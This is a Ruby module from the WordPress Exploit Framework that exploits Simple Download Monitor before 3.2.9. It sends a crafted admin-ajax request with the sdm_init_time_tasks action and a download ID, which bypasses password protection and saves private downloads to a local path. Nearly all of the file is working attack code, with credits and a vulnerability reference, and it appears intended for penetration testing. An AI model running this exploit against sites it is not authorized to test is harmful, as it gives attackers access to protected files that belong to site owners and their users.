class Wpxf::Auxiliary::SimpleDownloadMonitorFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Simple Download Monitor File Download',
      desc: 'This module uses a lack of session validation to bypass the '\
            'password protection on private downloads. To gain a full list of '\
            'downloads available, use the '\
            'auxiliary/simple_download_monitor_file_disclosure module.',
      author: [
        'James Golovich',                  # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8364'],
        ['URL', 'http://www.pritect.net/blog/simple-download-monitor-3-2-8-security-vulnerability']
      ],
      date: 'Jan 19 2016'
    )

    register_options([
      StringOption.new(
        name: 'download_path',
        desc: 'The path to save the file to',
        required: true
      ),
      IntegerOption.new(
        name: 'post_id',
        desc: 'The post ID of the download',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('simple-download-monitor', '3.2.9')
  end

  def download_path
    normalized_option_value('download_path')
  end

  def post_id
    normalized_option_value('post_id')
  end

  def run
    return false unless super

    emit_info 'Requesting file...'
    res = download_file(
      url: wordpress_url_admin_ajax,
      method: :get,
      local_filename: download_path,
      params: {
        'action' => 'sdm_init_time_tasks',
        'smd_process_download' => '1',
        'download_id' => post_id.to_s
      }
    )

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    body = File.read(download_path)
    if body =~ /This download item \([0-9]+\) does not have any download link/i
      emit_warning 'The file you requested appears to be invalid'
    end

    true
  end
end
